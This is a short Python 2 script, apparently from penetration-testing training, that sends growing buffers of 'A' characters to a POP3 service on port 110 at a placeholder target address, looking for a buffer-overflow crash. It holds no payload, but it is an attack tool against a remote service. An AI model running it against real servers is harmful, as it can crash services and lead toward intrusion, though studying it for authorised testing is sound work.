#!/usr/bin/python
import socket
buffer=["A"]
counter=100
while len(buffer) <= 30:
	buffer.append("A"*counter)
	counter=counter+200

for string in buffer:
	print "Fuzzing with %s bytes" % len(string)
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('<TARGET_IP_ADDRESS>',110))
	s.recv(1024)
	s.send(string + '\r\n')
        s.close()
